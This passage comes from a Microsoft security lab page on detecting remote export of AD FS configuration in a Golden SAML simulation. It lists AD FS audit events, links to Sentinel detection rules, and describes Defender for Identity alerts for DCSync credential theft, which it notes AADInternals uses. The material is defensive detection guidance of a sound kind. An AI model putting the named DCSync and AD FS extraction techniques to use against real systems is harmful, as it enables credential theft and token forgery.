<p>Another behavior that we could monitor is the <code class="docutils literal notranslate"><span class="pre">authorization</span> <span class="pre">check</span></code> enforced by the AD FS replication service on the main federation server. We can use security events <code class="docutils literal notranslate"><span class="pre">412</span></code> and <code class="docutils literal notranslate"><span class="pre">501</span></code> from the <code class="docutils literal notranslate"><span class="pre">AD</span> <span class="pre">FS</span> <span class="pre">auditing</span></code> event provider to capture this behavior. These two events can be joined on the <code class="docutils literal notranslate"><span class="pre">Instance</span> <span class="pre">ID</span></code> value for additional context and to filter out other authentication events.</p>
<p><img alt="" src="../../../../_images/2021-05-19_09_adfs_remote_connection_adfsauditing.png" /></p>
<div class="section" id="azure-sentinel-detection-rules">
<h4>Azure Sentinel Detection Rules<a class="headerlink" href="#azure-sentinel-detection-rules" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/ADFSRemoteHTTPNetworkConnection.yaml">AD FS Remote HTTP Network Connection</a></p></li>
<li><p><a class="reference external" href="https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/ADFSRemoteAuthSyncConnection.yaml">AD FS Remote Auth Sync Connection</a></p></li>
</ul>
</div>
</div>
<div class="section" id="detect-active-directory-replication-services">
<h3>Detect Active Directory Replication Services<a class="headerlink" href="#detect-active-directory-replication-services" title="Permalink to this headline">¶</a></h3>
<p>Even though the use of directory replication services (DRS) is not part of the core behavior to extract the AD FS configuration settings remotely, it is an additional step taken by tools such as <a class="reference external" href="https://github.com/Gerenios/AADInternals">AADInternals</a> to get the NTHash of the AD FS user account to access the AD FS database remotely.</p>
<div class="section" id="microsoft-defender-for-identity-alerts">
<h4>Microsoft Defender for Identity Alerts<a class="headerlink" href="#microsoft-defender-for-identity-alerts" title="Permalink to this headline">¶</a></h4>
<p><strong>Suspected DCSync attack (replication of directory services)</strong></p>
<p>The Microsoft Defender for Identity (MDI) sensor, installed on the domain controller, triggers an alert when this occurs. MDI detects non-domain controllers using Directory Replication Services (DRS) to sync information from the domain controller.</p>
<ol class="simple">
<li><p>Navigate to <a class="reference external" href="https://security.microsoft.com/">Microsoft 365 Security Center</a>.</p></li>
<li><p>Go to <code class="docutils literal notranslate"><span class="pre">More</span> <span class="pre">Resources</span></code> and click on <code class="docutils literal notranslate"><span class="pre">Azure</span> <span class="pre">Advanced</span> <span class="pre">Threat</span> <span class="pre">Protection</span></code>.</p></li>
</ol>
<p><img alt="" src="../../../../_images/2021-05-19_10_m365_mdi_alert_dcsync.png" /></p>
</div>
<div class="section" id="microsoft-cloud-application-security-alerts">
<h4>Microsoft Cloud Application Security Alerts<a class="headerlink" href="#microsoft-cloud-application-security-alerts" title="Permalink to this headline">¶</a></h4>
<p><strong>Suspected DCSync attack (replication of directory services)</strong></p>
<p>You can also see the same alert in the Microsoft Cloud Application Security (MCAS) portal. The MCAS portal is considered the new investigation experience for MDI.</p>
<ol class="simple">
<li><p>Navigate to <a class="reference external" href="https://security.microsoft.com/">Microsoft 365 Security Center</a></p></li>
<li><p>Go to “More Resources” and click on “<a class="reference external" href="https://portal.cloudappsecurity.com/">Microsoft Cloud App Security</a>”.</p></li>
</ol>
<p><img alt="" src="../../../../_images/2021-05-19_11_m365_mcas_alert_dcsync.png" /></p>
</div>
</div>
</div>
<div class="section" id="output">
<h2>Output<a class="headerlink" href="#output" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p>AD FS Configuration Settings</p></li>
</ul>
</div>
<div class="section" id="references">
<h2>References<a class="headerlink" href="#references" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p><a class="reference external" href="https://o365blog.com/post/adfs/">Exporting ADFS certificates revisited: Tactics, Techniques and Procedures (o365blog.com)</a></p></li>
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-the-ad-fs-configuration-database">The Role of the AD FS Configuration Database | Microsoft Docs</a></p></li>
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/sql/relational-databases/security/auditing/create-a-server-audit-and-database-audit-specification?view=sql-server-ver15">Create a server audit and database audit specification</a></p></li>
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-action-groups-and-actions?view=sql-server-ver15">SQL Server Audit Action Groups and Actions</a></p></li>
</ul>
</div>
</div>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "binder-examples/jupyter-stacks-datascience",
            ref: "master",
        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: "python"
        },
        kernelOptions: {
            kernelName: "python3",
            path: "./labs\GoldenSAML\simulation\export-adfs-configuration"
        },
        predefinedOutput: true
    }
    </script>
    <script>kernelName = 'python3'</script>

              </div>
              
            
                <!-- Previous / next buttons -->
<div class='prev-next-area'> 
    <a class='left-prev' id="prev-link" href="exportADFSConfigLocalNamedPipe.html" title="previous page">
        <i class="fas fa-angle-left"></i>
        <div class="prev-next-info">
            <p class="prev-next-subtitle">previous</p>
            <p class="prev-next-title">Export AD FS Configuration via a Local Named Pipe</p>
        </div>
    </a>
    <a class='right-next' id="next-link" href="exportADFSConfigDotNETReflection.html" title="next page">
    <div class="prev-next-info">
        <p class="prev-next-subtitle">next</p>
        <p class="prev-next-title">Export AD FS Configuration via .NET Reflection</p>
    </div>
    <i class="fas fa-angle-right"></i>
    </a>
</div>
            
        </div>
    </div>
    <footer class="footer">
  <p>
    
      By Microsoft Corporation<br/>
    
        &copy; Copyright 2021.<br/>
  </p>
</footer>
</main>


      </div>
    </div>
  
  <script src="../../../../_static/js/index.be7d3bbb2ef33a8344ce.js"></script>

  </body>
</html>